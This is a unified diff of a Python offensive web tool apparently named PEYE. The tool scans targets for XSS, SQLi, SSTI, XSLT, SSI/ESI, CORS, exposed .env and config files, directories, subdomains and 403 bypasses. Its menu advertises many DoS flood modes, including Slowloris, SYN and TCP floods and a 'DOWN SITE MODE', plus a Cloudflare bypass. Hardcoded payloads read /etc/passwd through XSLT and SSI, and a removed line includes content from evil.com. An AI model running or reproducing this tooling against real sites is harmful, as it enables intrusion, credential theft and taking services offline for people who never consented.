         print(f"{YELLOW}[!] VULNERABILITIES FOUND!{RESET}")
         print(f"{RED}{'='*70}{RESET}")
-        
         for i, vuln in enumerate(self.findings, 1):
             print(f"\n{CYAN}[{i}] {RED}{vuln['type']} VULNERABILITY{RESET}")
             print(f"    {WHITE}URL:{RESET} {vuln['url']}")
@@ -1246,21 +628,14 @@ class VulnerabilityReport:
             if vuln['detail']:
                 print(f"    {WHITE}Detail:{RESET} {vuln['detail']}")
             print(f"    {WHITE}Time:{RESET} {vuln['time']}")
-        
         print(f"\n{RED}{'='*70}{RESET}")
         print(f"{YELLOW}[!] Total: {len(self.findings)} vulnerabilities found{RESET}")
         print(f"{RED}{'='*70}{RESET}")
-        
         filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(filename, 'w') as f:
-            f.write(f"PEYE Vulnerability Report\n")
-            f.write(f"Target: {self.target}\n")
-            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"{'='*70}\n\n")
+            f.write(f"PEYE Vulnerability Report\nTarget: {self.target}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*70}\n\n")
             for vuln in self.findings:
-                f.write(f"[{vuln['type']}] {vuln['url']}\n")
-                f.write(f"Payload: {vuln['payload']}\n")
-                f.write(f"Status: {vuln['status']}\n\n")
+                f.write(f"[{vuln['type']}] {vuln['url']}\nPayload: {vuln['payload']}\nStatus: {vuln['status']}\n\n")
         print(f"{GREEN}[✓] Report saved to: {filename}{RESET}")
 
 class AdvancedScanner:
@@ -1271,7 +646,6 @@ class AdvancedScanner:
         self.results = defaultdict(list)
         self.report = VulnerabilityReport()
         self.report.target = target
-        self.report.scan_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.threads = 50
     
     def check_connection(self, url):
@@ -1280,10 +654,10 @@ class AdvancedScanner:
             if resp.status_code == 200:
                 return True, resp.status_code
             elif resp.status_code == 403:
-                print(f"{RED}[✗] Access Denied (403 Forbidden) - Cannot scan{RESET}")
+                print(f"{RED}[✗] Access Denied (403 Forbidden){RESET}")
                 return False, 403
             elif resp.status_code == 404:
-                print(f"{RED}[✗] Not Found (404) - Target tidak ditemukan{RESET}")
+                print(f"{RED}[✗] Not Found (404){RESET}")
                 return False, 404
             else:
                 return False, resp.status_code
@@ -1294,15 +668,10 @@ class AdvancedScanner:
         if not payloads:
             print(f"{YELLOW}[!] No {vuln_type} payloads loaded{RESET}")
             return []
-        
         print(f"\n{CYAN}[*] Scanning {vuln_type}... (Total: {len(payloads)}){RESET}")
-        
         connected, status = self.check_connection(self.target)
         if not connected:
-            if status == 404:
-                print(f"{RED}[✗] Target Not Found (404){RESET}")
             return []
-        
         found = []
         total = len(payloads)
         
@@ -1311,233 +680,162 @@ class AdvancedScanner:
                 test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
                 try:
                     resp = self.session.get(test_url, timeout=5)
-                    if resp.status_code == 200:
-                        if indicator and indicator in resp.text:
-                            return (payload, test_url, resp.status_code, resp.text[:200])
-                    return None
+                    if resp.status_code == 200 and indicator and indicator in resp.text:
+                        return (payload, test_url, resp.status_code)
                 except:
                     return None
             else:
-                test_url = self.target
                 try:
-                    resp = self.session.post(test_url, data={param: payload}, timeout=5)
-                    if resp.status_code == 200:
-                        if indicator and indicator in resp.text:
-                            return (payload, test_url, resp.status_code, resp.text[:200])
-                    return None
+                    resp = self.session.post(self.target, data={param: payload}, timeout=5)
+                    if resp.status_code == 200 and indicator and indicator in resp.text:
+                        return (payload, self.target, resp.status_code)
                 except:
                     return None
+            return None
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = {executor.submit(test_payload, p): p for p in payloads}
             for i, future in enumerate(as_completed(futures), 1):
                 result = future.result()
                 if result:
-                    payload, test_url, status_code, detail = result
+                    payload, test_url, status_code = result
                     found.append(payload)
-                    self.report.add(vuln_type, test_url, payload, f"HTTP {status_code}", detail[:100])
+                    self.report.add(vuln_type, test_url, payload, f"HTTP {status_code}")
                     print(f"\n{RED}[!] {vuln_type} VULNERABLE!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {test_url}")
                     print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                     print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {status_code}{RESET}")
-                
-                if i % 50 == 0 and total > 0:
+                if i % 50 == 0:
                     print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
-        
         print(f"\n{GREEN}[✓] {vuln_type} complete: {len(found)}/{total} found{RESET}")
         self.results[vuln_type] = found
         return found
     
     def scan_csrf(self):
-        print(f"\n{CYAN}[*] Scanning CSRF Vulnerability...{RESET}")
+        print(f"\n{CYAN}[*] Scanning CSRF...{RESET}")
         payloads = self.wordlists.get('csrf')
         found = []
-        
         for payload in payloads:
             try:
                 resp = self.session.get(self.target, timeout=5)
-                if resp.status_code == 200:
-                    if payload in resp.text.lower():
-                        print(f"{RED}[!] CSRF Possible: {self.target}{RESET}")
-                        self.report.add("CSRF", self.target, payload, "Potential", "")
-                        found.append(payload)
+                if resp.status_code == 200 and payload in resp.text.lower():
+                    print(f"{RED}[!] CSRF Possible: {self.target}{RESET}")
+                    self.report.add("CSRF", self.target, payload, "Potential")
+                    found.append(payload)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] CSRF scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] CSRF complete: {len(found)} found{RESET}")
         return found
     
     def scan_cors(self):
-        print(f"\n{CYAN}[*] Scanning CORS Misconfiguration...{RESET}")
+        print(f"\n{CYAN}[*] Scanning CORS...{RESET}")
         origins = self.wordlists.get('cors')
         found = []
-        
         for origin in origins:
             try:
                 headers = {'Origin': origin}
                 resp = self.session.get(self.target, headers=headers, timeout=5)
-                if resp.headers.get('Access-Control-Allow-Origin') == origin or resp.headers.get('Access-Control-Allow-Origin') == '*':
-                    print(f"{RED}[!] CORS Misconfiguration: ACAO: {origin}{RESET}")
-                    self.report.add("CORS", self.target, origin, "Misconfigured", "")
+                if resp.headers.get('Access-Control-Allow-Origin') in [origin, '*']:
+                    print(f"{RED}[!] CORS Misconfiguration: {origin}{RESET}")
+                    self.report.add("CORS", self.target, origin, "Misconfigured")
                     found.append(origin)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] CORS scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] CORS complete: {len(found)} found{RESET}")
         return found
     
     def scan_clickjacking(self):
-        print(f"\n{CYAN}[*] Scanning Clickjacking Vulnerability...{RESET}")
+        print(f"\n{CYAN}[*] Scanning Clickjacking...{RESET}")
         try:
             resp = self.session.get(self.target, timeout=5)
             if resp.status_code == 200:
                 if 'X-Frame-Options' not in resp.headers:
-                    print(f"{RED}[!] Clickjacking Possible - No X-Frame-Options header{RESET}")
-                    self.report.add("Clickjacking", self.target, "", "Missing X-Frame-Options", "")
+                    print(f"{RED}[!] Clickjacking Possible - No X-Frame-Options{RESET}")
+                    self.report.add("Clickjacking", self.target, "", "Missing X-Frame-Options")
                 elif resp.headers.get('X-Frame-Options') == 'ALLOWALL':
                     print(f"{RED}[!] Clickjacking Possible - X-Frame-Options: ALLOWALL{RESET}")
-                    self.report.add("Clickjacking", self.target, "", "X-Frame-Options: ALLOWALL", "")
-                else:
-                    print(f"{GREEN}[✓] X-Frame-Options present: {resp.headers.get('X-Frame-Options')}{RESET}")
+                    self.report.add("Clickjacking", self.target, "", "X-Frame-Options: ALLOWALL")
         except:
             pass
-        
-        print(f"{GREEN}[✓] Clickjacking scan complete{RESET}")
+        print(f"{GREEN}[✓] Clickjacking complete{RESET}")
     
     def scan_opendir(self):
         print(f"\n{CYAN}[*] Scanning Open Directory...{RESET}")
         paths = self.wordlists.get('opendir')
         found = []
-        
         for path in paths:
             url = urljoin(self.target, path)
             try:
                 resp = self.session.get(url, timeout=5)
-                if resp.status_code == 200:
-                    if 'Index of' in resp.text or 'Parent Directory' in resp.text:
-                        print(f"{RED}[!] Open Directory Found: {url}{RESET}")
-                        self.report.add("Open Directory", url, "", "HTTP 200", "")
-                        found.append(url)
+                if resp.status_code == 200 and ('Index of' in resp.text or 'Parent Directory' in resp.text):
+                    print(f"{RED}[!] Open Directory Found: {url}{RESET}")
+                    self.report.add("Open Directory", url, "", "HTTP 200")
+                    found.append(url)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] Open Directory scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] Open Directory complete: {len(found)} found{RESET}")
         return found
     
     def scan_backup(self):
         print(f"\n{CYAN}[*] Scanning Backup Files...{RESET}")
         files = self.wordlists.get('backup')
         found = []
-        
         for file in files:
             url = urljoin(self.target, file)
             try:
                 resp = self.session.get(url, timeout=5)
                 if resp.status_code == 200:
                     print(f"{RED}[!] Backup File Found: {url}{RESET}")
-                    self.report.add("Backup File", url, "", "HTTP 200", "")
+                    self.report.add("Backup File", url, "", "HTTP 200")
                     found.append(url)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] Backup scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] Backup complete: {len(found)} found{RESET}")
         return found
     
     def scan_config(self):
         print(f"\n{CYAN}[*] Scanning Config Files...{RESET}")
         files = self.wordlists.get('config')
         found = []
-        
         for file in files:
             url = urljoin(self.target, file)
             try:
                 resp = self.session.get(url, timeout=5)
-                if resp.status_code == 200:
-                    if 'password' in resp.text.lower() or 'api_key' in resp.text.lower():
-                        print(f"{RED}[!] Config File Found: {url}{RESET}")
-                        self.report.add("Config File", url, "", "HTTP 200", "Contains sensitive data")
-                        found.append(url)
+                if resp.status_code == 200 and ('password' in resp.text.lower() or 'api_key' in resp.text.lower()):
+                    print(f"{RED}[!] Config File Found: {url}{RESET}")
+                    self.report.add("Config File", url, "", "HTTP 200")
+                    found.append(url)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] Config scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] Config complete: {len(found)} found{RESET}")
         return found
     
     def scan_env(self):
         print(f"\n{CYAN}[*] Scanning .env Files...{RESET}")
         files = self.wordlists.get('env')
         found = []
-        
         for file in files:
             url = urljoin(self.target, file)
             try:
                 resp = self.session.get(url, timeout=5)
-                if resp.status_code == 200:
-                    if 'DB_' in resp.text or 'APP_KEY' in resp.text or 'PASSWORD' in resp.text:
-                        print(f"{RED}[!] .env File Found: {url}{RESET}")
-                        self.report.add(".env File", url, "", "HTTP 200", "Contains credentials")
-                        found.append(url)
-            except:
-                pass
-        
-        print(f"{GREEN}[✓] .env scan complete: {len(found)} found{RESET}")
-        return found
-    
-    def scan_parameters(self):
-        print(f"\n{CYAN}[*] Scanning Parameters...{RESET}")
-        params = self.wordlists.get('parameters')
-        if not params:
-            params = ['id', 'q', 'page', 'file', 'dir', 'path', 'url', 'redirect', 'return', 'next']
-        found = []
-        
-        for param in params:
-            test_url = self.target + (('?' + param + '=test') if '?' not in self.target else ('&' + param + '=test'))
-            try:
-                resp1 = self.session.get(self.target, timeout=3)
-                resp2 = self.session.get(test_url, timeout=3)
-                if len(resp2.content) != len(resp1.content):
-                    print(f"{GREEN}[✓] Parameter Found: {param}{RESET}")
-                    found.append(param)
-            except:
-                pass
-        
-        print(f"{GREEN}[✓] Parameter scan complete: {len(found)} found{RESET}")
-        return found
-    
-    def scan_endpoints(self):
-        print(f"\n{CYAN}[*] Scanning Endpoints...{RESET}")
-        endpoints = self.wordlists.get('endpoints')
-        if not endpoints:
-            endpoints = ['api', 'v1', 'v2', 'admin', 'user', 'login', 'register', 'upload', 'download']
-        found = []
-        
-        for endpoint in endpoints:
-            url = urljoin(self.target, endpoint)
-            try:
-                resp = self.session.get(url, timeout=5)
-                if resp.status_code == 200:
-                    print(f"{GREEN}[✓] Endpoint Found: {url}{RESET}")
-                    self.report.add("Endpoint", url, "", "HTTP 200", "")
+                if resp.status_code == 200 and ('DB_' in resp.text or 'APP_KEY' in resp.text or 'PASSWORD' in resp.text):
+                    print(f"{RED}[!] .env File Found: {url}{RESET}")
+                    self.report.add(".env File", url, "", "HTTP 200")
                     found.append(url)
             except:
                 pass
-        
-        print(f"{GREEN}[✓] Endpoint scan complete: {len(found)} found{RESET}")
+        print(f"{GREEN}[✓] .env complete: {len(found)} found{RESET}")
         return found
     
     def dir_scan(self):
         dirs = self.wordlists.get('dirs')
         if not dirs:
-            dirs = ['admin', 'login', 'wp-admin', 'administrator', 'cpanel', 'dashboard', 'phpmyadmin', 'backup', 'config', 'api']
+            dirs = ['admin', 'login', 'wp-admin', 'administrator', 'cpanel', 'dashboard']
             print(f"{YELLOW}[!] No dirs.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Directory Bruteforce... (Total: {len(dirs)}){RESET}")
-        
         connected, status = self.check_connection(self.target)
         if not connected:
-            print(f"{RED}[✗] Cannot scan directories{RESET}")
             return []
-        
         found = []
         total = len(dirs)
         
@@ -1546,8 +844,7 @@ class AdvancedScanner:
             try:
                 resp = self.session.get(url, timeout=3, allow_redirects=False)
                 if resp.status_code == 200:
-                    return (url, resp.status_code, resp.headers.get('Content-Length', '?'))
-                return None
+                    return (url, resp.status_code)
             except:
                 return None
         
@@ -1556,25 +853,22 @@ class AdvancedScanner:
             for i, future in enumerate(as_completed(futures), 1):
                 result = future.result()
                 if result:
-                    url, code, size = result
+                    url, code = result
                     found.append(url)
                     print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
-                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code} ({size} bytes){RESET}")
-                    self.report.add("Directory", url, "", f"HTTP {code}", f"Size: {size} bytes")
-                
+                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code}{RESET}")
+                    self.report.add("Directory", url, "", f"HTTP {code}")
                 if i % 50 == 0:
                     print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
-        
-        print(f"\n{GREEN}[✓] Directory scan complete: {len(found)}/{total} found{RESET}")
+        print(f"\n{GREEN}[✓] Directory complete: {len(found)}/{total} found{RESET}")
         return found
     
     def subdomain_scan(self, domain):
         subs = self.wordlists.get('subdomains')
         if not subs:
-            subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'test', 'vpn', 'cpanel', 'webmail', 'ns1', 'ns2']
+            subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'test']
             print(f"{YELLOW}[!] No subdomains.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Subdomain Scan... (Total: {len(subs)}){RESET}")
         found = []
         total = len(subs)
@@ -1597,36 +891,26 @@ class AdvancedScanner:
                     print(f"\n{GREEN}[✓] SUBDOMAIN FOUND!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
                     print(f"    {WHITE}IP:{RESET} {ip}")
-                    self.report.add("Subdomain", url, "", f"IP: {ip}", "")
-                
+                    self.report.add("Subdomain", url, "", f"IP: {ip}")
                 if i % 50 == 0:
                     print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
-        
-        print(f"\n{GREEN}[✓] Subdomain scan complete: {len(found)}/{total} found{RESET}")
+        print(f"\n{GREEN}[✓] Subdomain complete: {len(found)}/{total} found{RESET}")
         return found
     
     def bypass403_scan(self):
         payloads = self.wordlists.get('bypass403')
         if not payloads:
-            payloads = ['/', '/%2e/', '/%2e%2e/', '/..;/', '/%252e%252e%252f']
+            payloads = ['/', '/%2e/', '/%2e%2e/', '/..;/']
             print(f"{YELLOW}[!] No bypass403.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Scanning 403 Bypass... (Total: {len(payloads)}){RESET}")
         found = []
         
         def test_bypass(payload):
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
-                'X-Forwarded-For': '127.0.0.1',
-                'X-Original-URL': payload,
-                'X-Rewrite-URL': payload,
-                'X-Forwarded-Host': 'localhost'
-            }
+            headers = {'X-Forwarded-For': '127.0.0.1', 'X-Original-URL': payload, 'X-Rewrite-URL': payload}
             try:
                 resp = self.session.get(self.target + payload, headers=headers, timeout=5)
                 if resp.status_code == 200:
                     return (payload, self.target + payload, resp.status_code)
-                return None
             except:
                 return None
         
@@ -1637,20 +921,18 @@ class AdvancedScanner:
                 if result:
                     payload, url, code = result
                     found.append(payload)
-                    self.report.add("403 Bypass", url, payload, f"HTTP {code}", "")
+                    self.report.add("403 Bypass", url, payload, f"HTTP {code}")
                     print(f"\n{GREEN}[✓] 403 BYPASS FOUND!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
                     print(f"    {WHITE}Technique:{RESET} {YELLOW}{payload}{RESET}")
-        
         print(f"{GREEN}[✓] 403 Bypass complete: {len(found)} found{RESET}")
         return found
     
     def ssti_scan(self):
         payloads = self.wordlists.get('ssti')
         if not payloads:
-            payloads = ['{{7*7}}', '${7*7}', '{{7*7}}', '{{config}}', '{{self.__class__}}']
+            payloads = ['{{7*7}}', '${7*7}', '{{config}}']
             print(f"{YELLOW}[!] No ssti.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Scanning SSTI... (Total: {len(payloads)}){RESET}")
         found = []
         
@@ -1658,12 +940,8 @@ class AdvancedScanner:
             test_url = self.target + (('?' + 'name' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'name' + '=' + quote(payload)))
             try:
                 resp = self.session.get(test_url, timeout=5)
-                if resp.status_code == 200:
-                    indicators = ['{{', '}}', '${', '49', '77']
-                    for ind in indicators:
-                        if ind in resp.text:
-                            return (payload, test_url, resp.status_code)
-                return None
+                if resp.status_code == 200 and ('{{' in resp.text or '}}' in resp.text):
+                    return (payload, test_url, resp.status_code)
             except:
                 return None
         
@@ -1674,11 +952,10 @@ class AdvancedScanner:
                 if result:
                     payload, url, code = result
                     found.append(payload)
-                    self.report.add("SSTI", url, payload, f"HTTP {code}", "")
+                    self.report.add("SSTI", url, payload, f"HTTP {code}")
                     print(f"\n{RED}[!] SSTI VULNERABLE!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
                     print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
-        
         print(f"{GREEN}[✓] SSTI complete: {len(found)} found{RESET}")
         return found
     
@@ -1687,7 +964,6 @@ class AdvancedScanner:
         if not payloads:
             payloads = ['<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>']
             print(f"{YELLOW}[!] No xslt.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Scanning XSLT Injection... (Total: {len(payloads)}){RESET}")
         found = []
         
@@ -1695,10 +971,8 @@ class AdvancedScanner:
             test_url = self.target + (('?' + 'xml' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'xml' + '=' + quote(payload)))
             try:
                 resp = self.session.get(test_url, timeout=5)
-                if resp.status_code == 200:
-                    if 'xsl:stylesheet' in resp.text or 'file://' in resp.text:
-                        return (payload, test_url, resp.status_code)
-                return None
+                if resp.status_code == 200 and ('xsl:stylesheet' in resp.text or 'file://' in resp.text):
+                    return (payload, test_url, resp.status_code)
             except:
                 return None
         
@@ -1709,19 +983,17 @@ class AdvancedScanner:
                 if result:
                     payload, url, code = result
                     found.append(payload)
-                    self.report.add("XSLT Injection", url, payload, f"HTTP {code}", "")
+                    self.report.add("XSLT Injection", url, payload, f"HTTP {code}")
                     print(f"\n{RED}[!] XSLT INJECTION VULNERABLE!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
-        
         print(f"{GREEN}[✓] XSLT complete: {len(found)} found{RESET}")
         return found
     
     def ssi_esi_scan(self):
         payloads = self.wordlists.get('ssi_esi')
         if not payloads:
-            payloads = ['<!--#exec cmd="ls" -->', '<!--#include file="../../etc/passwd"-->', '<esi:include src="http://evil.com"/>']
+            payloads = ['<!--#exec cmd="ls" -->', '<!--#include file="../../etc/passwd"-->']
             print(f"{YELLOW}[!] No ssi_esi.txt, using internal list{RESET}")
-        
         print(f"\n{CYAN}[*] Scanning SSI/ESI Injection... (Total: {len(payloads)}){RESET}")
         found = []
         
@@ -1729,12 +1001,8 @@ class AdvancedScanner:
             test_url = self.target + (('?' + 'page' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'page' + '=' + quote(payload)))
             try:
                 resp = self.session.get(test_url, timeout=5)
-                if resp.status_code == 200:
-                    indicators = ['<!--#', 'root:', 'uid=', 'bin/']
-                    for ind in indicators:
-                        if ind in resp.text:
-                            return (payload, test_url, resp.status_code)
-                return None
+                if resp.status_code == 200 and ('<!--#' in resp.text or 'root:' in resp.text):
+                    return (payload, test_url, resp.status_code)
             except:
                 return None
         
@@ -1745,10 +1013,9 @@ class AdvancedScanner:
                 if result:
                     payload, url, code = result
                     found.append(payload)
-                    self.report.add("SSI/ESI Injection", url, payload, f"HTTP {code}", "")
+                    self.report.add("SSI/ESI Injection", url, payload, f"HTTP {code}")
                     print(f"\n{RED}[!] SSI/ESI INJECTION VULNERABLE!{RESET}")
                     print(f"    {WHITE}URL:{RESET} {url}")
-        
         print(f"{GREEN}[✓] SSI/ESI complete: {len(found)} found{RESET}")
         return found
     
@@ -1759,10 +1026,7 @@ class AdvancedScanner:
         
         connected, status = self.check_connection(self.target)
         if not connected:
-            if status == 404:
-                print(f"{RED}[✗] Target Not Found (404) - Aborting scan{RESET}")
-            else:
-                print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
+            print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
             return
         
         self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
@@ -1780,8 +1044,6 @@ class AdvancedScanner:
         self.scan_backup()
         self.scan_config()
         self.scan_env()
-        self.scan_parameters()
-        self.scan_endpoints()
         self.dir_scan()
         
         print(f"\n{MAGENTA}{'='*70}{RESET}")
@@ -1794,21 +1056,16 @@ class AdvancedScanner:
                 total += len(findings)
         if total == 0:
             print(f"{GREEN}[✓] No vulnerabilities detected{RESET}")
-        
         self.report.display()
         print(f"{MAGENTA}{'='*70}{RESET}")
         return self.results
 
 class IPInfo:
-    def __init__(self):
-        self.session = requests.Session()
-    
     def get_ip_info(self, target):
         print(f"{CYAN}[*] Getting IP information for {target}...{RESET}")
         try:
             ip = socket.gethostbyname(target)
             print(f"{GREEN}[✓] IP Address: {ip}{RESET}")
-            
             try:
                 geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                 if geo.get('status') == 'success':
@@ -1829,19 +1086,16 @@ class PortScanner:
         print(f"{CYAN}[*] Scanning ports on {target}...{RESET}")
         ports = ports or self.common_ports
         open_ports = []
-        
         for port in ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(1)
-                result = sock.connect_ex((target, port))
-                if result == 0:
+                if sock.connect_ex((target, port)) == 0:
                     open_ports.append(port)
                     print(f"{GREEN}[✓] Port {port} OPEN{RESET}")
                 sock.close()
             except:
                 pass
-        
         print(f"{GREEN}[✓] Found {len(open_ports)} open ports{RESET}")
         return open_ports
 
@@ -1852,23 +1106,15 @@ class CMSDetector:
     
     def detect(self):
         print(f"{CYAN}[*] Detecting CMS...{RESET}")
-        cms_list = {
-            'WordPress': ['wp-content', 'wp-includes'],
-            'Joomla': ['joomla', 'com_content'],
-            'Laravel': ['laravel', 'csrf-token'],
-            'Drupal': ['drupal', 'sites/default']
-        }
-        
+        cms_list = {'WordPress': ['wp-content', 'wp-includes'], 'Joomla': ['joomla', 'com_content'], 'Laravel': ['laravel', 'csrf-token'], 'Drupal': ['drupal', 'sites/default']}
         try:
             resp = self.session.get(self.target, timeout=10)
             html = resp.text.lower()
-            
             for cms, patterns in cms_list.items():
                 for pattern in patterns:
                     if pattern.lower() in html:
                         print(f"{GREEN}[✓] CMS Detected: {cms}{RESET}")
                         return cms
-            
             print(f"{YELLOW}[!] No CMS detected{RESET}")
             return None
         except:
@@ -1894,45 +1140,31 @@ class Peye:
 ║ {CYAN}[1] {WHITE}Full Vulnerability Scan                                                     ║
 ║ {CYAN}[2] {WHITE}XSS | SQLi | LFI | XXE | SSTI | XSLT | SSI/ESI                              ║
 ║ {CYAN}[3] {WHITE}CSRF | CORS | Clickjacking | OpenDir | Backup | Config | .env               ║
-║ {CYAN}[4] {WHITE}Directory Bruteforce | Subdomain | Parameter | Endpoint                     ║
-║ {CYAN}[5] {WHITE}403 Bypass Scanner                                                         ║
+║ {CYAN}[4] {WHITE}Directory Bruteforce | Subdomain | 403 Bypass                               ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
-║ {CYAN}[6] {WHITE}Search with Google Dork                                                     ║
-║ {CYAN}[7] {WHITE}Search from dork.txt File                                                   ║
-║ {CYAN}[8] {WHITE}Search by Technology                                                        ║
-║ {CYAN}[9] {WHITE}Show Popular Dorks                                                         ║
+║ {CYAN}[5] {WHITE}Search with Google Dork                                                     ║
+║ {CYAN}[6] {WHITE}Search from dork.txt File                                                   ║
+║ {CYAN}[7] {WHITE}Search by Technology                                                        ║
+║ {CYAN}[8] {WHITE}Show Popular Dorks                                                         ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {MAGENTA}[🛠️ EXTRA TOOLS]{RESET}{YELLOW}                                                    ║
-║ {CYAN}[10] {WHITE}IP Information & Geolocation                                              ║
-║ {CYAN}[11] {WHITE}Port Scanner                                                              ║
-║ {CYAN}[12] {WHITE}CMS Detector                                                              ║
-║ {CYAN}[13] {WHITE}SSL/TLS Checker                                                           ║
-║ {CYAN}[14] {WHITE}HTTP Header Analyzer                                                      ║
-║ {CYAN}[15] {WHITE}Check for Updates                                                         ║
-║ {CYAN}[16] {WHITE}Cloudflare UAM Bypass (3 Methods Ganas)                                   ║
+║ {CYAN}[9] {WHITE}IP Information & Geolocation                                               ║
+║ {CYAN}[10] {WHITE}Port Scanner                                                              ║
+║ {CYAN}[11] {WHITE}CMS Detector                                                              ║
+║ {CYAN}[12] {WHITE}SSL/TLS Checker                                                           ║
+║ {CYAN}[13] {WHITE}HTTP Header Analyzer                                                      ║
 ╠══════════════════════════════════════════════════════════════════╣
-║ {MAGENTA}[💥 DoS ATTACK - LAYER 7]{RESET}{YELLOW}                                                      ║
-║ {CYAN}[17] HTTP GET          [18] HTTP POST         [19] HTTP HEAD                            ║
-║ {CYAN}[20] HTTP PUT          [21] HTTP DELETE       [22] HTTP PATCH                           ║
-║ {CYAN}[23] HTTP OPTIONS      [24] HTTP TRACE        [25] HTTP CONNECT                         ║
-║ {CYAN}[26] HTTP RANDOM       [27] SLOW POST         [28] SLOW READ                            ║
-║ {CYAN}[29] SLOWLORIS         [30] RUDY              [31] CACHE FLOOD                          ║
-║ {CYAN}[32] WAF BYPASS        [33] XMLRPC                                                      ║
-╠══════════════════════════════════════════════════════════════════╣
-║ {MAGENTA}[💥 DoS ATTACK - LAYER 7 (HTTP/2)]{RESET}{YELLOW}                                                 ║
-║ {CYAN}[34] HTTP/2 GET        [35] HTTP/2 POST       [36] HTTP/2 RAPID                         ║
-║ {CYAN}[37] HTTP/2 PING                                                                       ║
-╠══════════════════════════════════════════════════════════════════╣
-║ {MAGENTA}[💥 DoS ATTACK - LAYER 4]{RESET}{YELLOW}                                                      ║
-║ {CYAN}[38] TCP Flood         [39] UDP Flood         [40] SYN Flood (Root)                     ║
-║ {CYAN}[41] ACK Flood (Root)  [42] FIN Flood (Root)  [43] RST Flood (Root)                     ║
-║ {CYAN}[44] XMAS Flood (Root) [45] NULL Flood (Root) [46] Mixed Methods                        ║
-║ {CYAN}[47] ALL ATTACKS       [48] DOWN SITE MODE                                              ║
+║ {MAGENTA}[💥 DoS ATTACK]{RESET}{YELLOW}                                                               ║
+║ {CYAN}[14] {WHITE}HTTP GET Flood          [15] {WHITE}HTTP POST Flood                              ║
+║ {CYAN}[16] {WHITE}HTTP HEAD Flood         [17] {WHITE}HTTP RANDOM Flood                            ║
+║ {CYAN}[18] {WHITE}Slowloris               [19] {WHITE}Cache Flood                                  ║
+║ {CYAN}[20] {WHITE}TCP Flood               [21] {WHITE}Mixed Methods                                ║
+║ {CYAN}[22] {WHITE}ALL ATTACKS             [23] {WHITE}DOWN SITE MODE                               ║
+║ {CYAN}[24] {WHITE}HTTP/2 Flood (JS Module) [NEW!]                                                ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ {CYAN}[S] {WHITE}Toggle SAA (Slash Agg Anoying) - Current: {saa_status}                              ║
 ║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                            ║
-║ {CYAN}[U] {WHITE}Check & Update                                                                  ║
 ║ {CYAN}[0] {WHITE}Exit                                                                           ║
 ╚══════════════════════════════════════════════════════════════════╝{RESET}
 """)
@@ -1957,27 +1189,21 @@ class Peye:
             
             if choice == 'S':
                 self.saa_enabled = not self.saa_enabled
-                print(f"{GREEN}[✓] SAA (Slash Agg Anoying): {'ON' if self.saa_enabled else 'OFF'}{RESET}")
+                print(f"{GREEN}[✓] SAA: {'ON' if self.saa_enabled else 'OFF'}{RESET}")
                 time.sleep(1)
                 os.system('clear')
                 print_banner()
                 continue
             
-            if choice == 'U':
-                check_update()
-                input(f"\n{YELLOW}Enter to continue{RESET}")
-                os.system('clear')
-                print_banner()
-                continue
-            
             # Scanner options
-            if choice in ['1','2','3','4','5']:
+            if choice in ['1','2','3','4']:
